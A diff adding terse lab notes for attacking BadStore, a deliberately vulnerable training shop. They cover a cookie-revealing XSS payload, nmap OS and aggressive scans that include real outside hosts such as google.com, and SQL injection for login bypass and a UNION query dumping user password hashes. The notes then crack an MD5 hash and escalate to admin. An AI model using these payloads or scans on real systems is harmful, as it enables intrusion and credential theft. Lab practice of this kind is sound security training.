@@ -1,0 +1,60 @@
+p10.
+(a)
+
+open badstore
+
+click what's new
+add item to cart
+
+go to search on left side
+
+<script>alert(document.cookie)</script>
+
+press enter
+
+output shows cartid (cookie value)
+
+(b)
+nmap -O 192.168.56.1
+nmap -O bnmit.org
+nmap -A 192.168.56.1
+nmap -A google.com
+(c)
+
+open badstore
+
+login using:
+
+admin' --
+
+go to search
+
+right click → inspect
+remove maxlength restriction
+
+in search box enter:
+
+xx' IN (itemnum,sdesc,ldesc) UNION SELECT email,passwd,123,123 FROM userdb LIMIT 2 -- 
+
+copy admin password
+
+right click → search in google
+open MD5 decrypt
+paste hash → get password
+
+come back to badstore
+login as admin using decrypted password
+
+change address bar:
+
+login → admin
+
+in dropdown select add user
+click do it
+
+inspect the page
+press ctrl + f
+search "hidden"
+
+hidden password field is visible → this is the output
+
